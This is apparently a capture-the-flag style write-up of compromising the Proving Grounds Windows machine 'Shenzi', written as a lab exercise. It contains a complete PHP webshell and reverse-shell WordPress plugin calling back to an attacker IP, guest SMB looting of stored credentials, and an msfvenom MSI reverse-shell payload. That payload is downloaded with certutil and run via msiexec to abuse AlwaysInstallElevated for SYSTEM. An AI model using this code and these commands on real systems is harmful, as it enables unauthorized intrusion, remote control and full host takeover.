---
machine: Shenzi
platform: Proving Grounds
category: Windows
difficulty: Medium
tags: [wordpress, smb-guest, credential-exposure, malicious-plugin, alwaysinstallelevated]
date: 2026-08-19
status: retired
summary: A Windows XAMPP box hiding a WordPress install behind a guessable directory name — testing guest-accessible SMB shares for leaked default credentials, an authenticated malicious-plugin upload for a reverse-shell foothold, and the classic AlwaysInstallElevated MSI misconfiguration for SYSTEM.
---

## Enumeration

nmap scans:

```bash
┌──(kali㉿kali)-[~/oscp/shenzi/nmapscans]
└─$ nmap-full target
[*] Running fast port discovery on target...
[sudo] password for kali: 
[*] Open ports: 21,80,135,139,443,445,3306,5040,7680,49664,49665,49666,49667,49668,49669
[*] Running full scan on target...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 17:51 -0400
Nmap scan report for target (192.168.107.55)
Host is up (0.035s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://target/dashboard/
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| http-title: Welcome to XAMPP
|_Requested resource was https://target/dashboard/
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-08-19T21:54:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.15 seconds
```

We find we have guest SMB access:

```bash
┌──(kali㉿kali)-[~/oscp/shenzi/nmapscans]
└─$ nxc smb target -u 'guest' -p ''  --shares
SMB         192.168.107.55  445    SHENZI           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SHENZI) (domain:shenzi) (signing:False) (SMBv1:None)                                                                                                                                                     
SMB         192.168.107.55  445    SHENZI           [+] shenzi\guest: 
SMB         192.168.107.55  445    SHENZI           [*] Enumerated shares
SMB         192.168.107.55  445    SHENZI           Share           Permissions     Remark
SMB         192.168.107.55  445    SHENZI           -----           -----------     ------
SMB         192.168.107.55  445    SHENZI           IPC$            READ            Remote IPC
SMB         192.168.107.55  445    SHENZI           Shenzi          READ  
```

Connect and download the files

```bash
┌──(kali㉿kali)-[~/oscp/shenzi/nmapscans]
└─$ smbclient //192.168.107.55/Shenzi -U "guest%"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu May 28 11:45:09 2020
  ..                                  D        0  Thu May 28 11:45:09 2020
  passwords.txt                       A      894  Thu May 28 11:45:09 2020
  readme_en.txt                       A     7367  Thu May 28 11:45:09 2020
  sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Thu May 28 11:45:09 2020
  why.tmp                             A      213  Thu May 28 11:45:09 2020
  xampp-control.ini                   A      178  Thu May 28 11:45:09 2020

                12941823 blocks of size 4096. 6246271 blocks available
smb: \> mget *
Get file passwords.txt? 
Get file readme_en.txt? 
Get file sess_klk75u2q4rpgfjs3785h6hpipp? 
Get file why.tmp? 
Get file xampp-control.ini? 

```

Passwords.txt has one custom credential for WordPress:

```bash
┌──(kali㉿kali)-[~/oscp/shenzi/nmapscans]
└─$ cat passwords.txt                  
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

5) WordPress:

   User: admin
   Password: FeltHeadwallWight357
```

We have user: `admin:FeltHeadwallWight357` but cannot seem to spray it anywhere successfully

Reading `sess_klk75u2q4rpgfjs3785h6hpipp` we find some versions:

```json
        {
            "date": "2020-03-21", 
            "php_versions": ">=7.1,<8.0", 
            "version": "5.0.2", 
            "mysql_versions": ">=5.5"
        }
        {
            "date": "2020-03-21", 
            "php_versions": ">=7.1,<8.0", 
            "version": "5.0.2", 
            "mysql_versions": ">=5.5"
        }

```

I got stuck here and had to reference a writeup. The solution was to guess that the wordpress site was located at directory `shenzi` based off of the box name and the user's name, as even the largest wordlists dont include shenzi.

## Foothold

We locate the wordpress site and login with the creds we found:

```text
https://target/shenzi/wp-admin
```

We gain admin access to the wordpress site and need to gain RCE.

We can do this via making a malicious PHP plugin and then zipping it into a zip file:

```php
<?php
/**
 * Plugin Name: Custom Shell Utility
 * Description: Diagnostic tool for remote command execution.
 * Version: 1.0
 * Author: Administrator
 */

if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

# in kali
zip mal.zip mal.php
```

I make one that is both a php webshell and a php reverse shell so I can directly catch it to my listener upon uploading (if this doesn't work you would navigate to the plugin location and execute it manually or query the webshell):

```php
#make php file called mal.php
<?php
/**
 * Plugin Name: Custom Shell Utility
 * Description: Diagnostic tool for remote command execution.
 * Version: 1.0
 * Author: Administrator
 */

if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = '/bin/bash';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
                                                $status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('192.168.45.151', 80);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```

```bash
# convert into zip file on kali
zip mal.zip mal.php

# start listener and upload the zip file to Upload Plugins

┌──(kali㉿kali)-[~/oscp/shenzi/nmapscans]
└─$ sudo rlwrap -cAr nc -lvnp 80
[sudo] password for kali: 
listening on [any] 80 ...
connect to [192.168.45.151] from (UNKNOWN) [192.168.107.55] 51380
SOCKET: Shell has connected! PID: 5332
Microsoft Windows [Version 10.0.19042.1526]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\shenzi\wp-admin>whoami
shenzi\shenzi
```

From here we can read local.txt on user `shenzi`'s desktop and move on to privilege escalation:

## Privilege Escalation

We run winPEAS and find:

```text
����������͹ Checking AlwaysInstallElevated (T1548.002)
�  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

We can generate a .msi executable with msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.151 LPORT=445 -f msi -o reverse.msi
```

```powershell
C:\Users\shenzi\Documents>certutil -urlcache -split -f http://192.168.45.151/reverse.msi C:\users\public\documents\reverse.msi
****  Online  ****
  000000  ...
  027000
CertUtil: -URLCache command completed successfully.
```

We can run msiexec to call our `reverse.msi` to fire a shell as SYSTEM:

```powershell
C:\Users\Public\Documents>msiexec /quiet /qn /i C:\Users\Public\Documents\reverse.msi


──(kali㉿kali)-[~/oscp/tools]
└─$ sudo rlwrap -cAr nc -lvnp 445
listening on [any] 445 ...
connect to [192.168.45.151] from (UNKNOWN) [192.168.107.55] 51623
Microsoft Windows [Version 10.0.19042.1526]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```

We have SYSTEM access and can collect the flag from the Administrator's desktop. Box compromised!
